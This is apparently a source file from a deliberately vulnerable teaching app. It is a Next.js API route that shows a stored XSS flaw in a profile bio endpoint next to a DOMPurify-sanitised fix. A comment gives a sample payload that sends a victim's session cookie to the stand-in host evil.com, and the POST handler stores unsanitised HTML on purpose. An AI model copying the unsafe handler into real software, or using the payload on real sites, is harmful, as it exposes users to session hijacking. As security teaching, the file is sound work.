import { NextRequest, NextResponse } from 'next/server'
import DOMPurify from 'isomorphic-dompurify'
import { prisma } from '@/app/lib/db/client'

// VULNERABILITY: Stored XSS in profile bio
// This endpoint exists ONLY to demonstrate and document the vulnerability
// See SECURITY-REPORT.md entry #02 for exploit details and remediation

// VULN: POST /api/users/bio — stores raw HTML without sanitization
// Attacker submits: <script>document.location='https://evil.com?c='+document.cookie</script>
// Effect: any user viewing the profile executes attacker's script, leaking session cookies
export async function POST(req: NextRequest) {
  const userId = req.headers.get('x-user-id')
  if (!userId) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const { bio } = await req.json()

  // VULNERABLE: raw input stored directly — no sanitization
  const user = await prisma.user.update({
    where: { id: userId },
    data: { bio },
    select: { id: true, bio: true },
  })

  return NextResponse.json({ user, _debug: { warning: 'bio stored without sanitization' } })
}

// FIXED: DOMPurify strips all HTML tags and attributes before storing
export async function PUT(req: NextRequest) {
  const userId = req.headers.get('x-user-id')
  if (!userId) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const { bio } = await req.json()

  // SAFE: ALLOWED_TAGS: [] strips everything — only plain text stored
  const sanitized = DOMPurify.sanitize(bio, { ALLOWED_TAGS: [] })

  const user = await prisma.user.update({
    where: { id: userId },
    data: { bio: sanitized },
    select: { id: true, bio: true },
  })

  return NextResponse.json({ user })
}
